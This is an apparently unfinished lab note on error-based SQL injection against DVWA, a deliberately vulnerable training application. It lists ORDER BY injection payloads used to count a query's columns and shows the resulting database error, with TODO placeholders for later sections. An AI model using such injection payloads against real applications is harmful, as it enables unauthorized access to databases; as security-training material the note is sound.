#dvwa #sqli #error-based

## 2.1 - Dump Database

### 2.1.1 - Columns Enumeration

#### 2.1.1.1 - ORDER BY Detection

^f521af

We need to determine number of columns before we perform

```sql
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
```

`<Insert screenshot ORDER BY 1>`

```
Unknown column '3' in 'order clause'
```

3 - 1 = 2

We have two columns.

#### 2.1.1.2 - GROUP BY Detection

TODO: Include GROUP BY for enumeration (check the references)

## 2.2 - SubQuery Injection

TODO: Fill the information with a step by step approach using error-based subquery SQL injection
